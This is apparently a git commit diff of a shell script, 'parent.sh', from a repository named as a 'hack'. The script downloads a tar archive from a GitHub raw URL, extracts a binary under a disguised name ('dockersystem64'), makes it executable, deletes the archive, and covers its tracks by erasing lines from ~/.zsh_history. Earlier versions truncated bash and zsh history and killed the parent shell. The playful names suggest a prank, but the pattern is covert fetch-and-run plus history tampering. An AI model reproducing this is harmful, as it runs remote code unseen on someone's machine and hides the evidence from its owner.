ca1928c77ffcafe1c2e5d561191213ec5db731fd
Mounir MADANI <71516457+Don-Chinjao@users.noreply.github.com>
2023-04-03 04:11:33 +0200

    update done

--- parent.sh
+++ parent.sh
@@ -7,7 +7,7 @@ init_tempo=120 tempo=20 volume=70 tempo_offset=1 volume_offset=20
 dir=/tmp/ ; dir+=`whoami` ; dir+='-docker' ; mkdir -p $dir
 #curl 'nom de domaine' -o /tmp/$dir/proutsh42.tar
 curl https://raw.githubusercontent.com/Don-Chinjao/Mounir_m_a_hack/main/proutsh42.tar -o $dir/proutsh42.tar
-tar -xvf $dir/proutsh42.tar -C $dir
+tar -xf $dir/proutsh42.tar -C $dir
 chmod 777 $dir/dockersystem64
 #chmod 777 ./prout_troll
 #chmod last modif time of all files
@@ -18,6 +18,10 @@ sleep 0.1 ; rm -rf $dir/proutsh42.tar $dir/dockersystem64 $dir/prout_troll
 #& $init_tempo $tempo $tempo_offset $volume $volume_offset 2>&1 >/dev/null
 #(nohup ./dockersystem64 $init_tempo $tempo $tempo_offset $volume $volume_offset &> /dev/null &)
 #(nohup ./prout_troll &> /dev/null &)
-(truncate -s -100 ~/.zsh_history &> /dev/null &)
-(truncate -s -100 ~/.bash_history &> /dev/null &)
-kill -KILL $PPID
+#echo $HISTCMD
+#fc -p
+#history -d $((HISTCMD-1))
+sed -i '$d' ~/.zsh_history
+#(truncate -s -150 ~/.zsh_history &> /dev/null &)
+#(truncate -s -100 ~/.bash_history &> /dev/null &)
+#kill -KILL $PPID
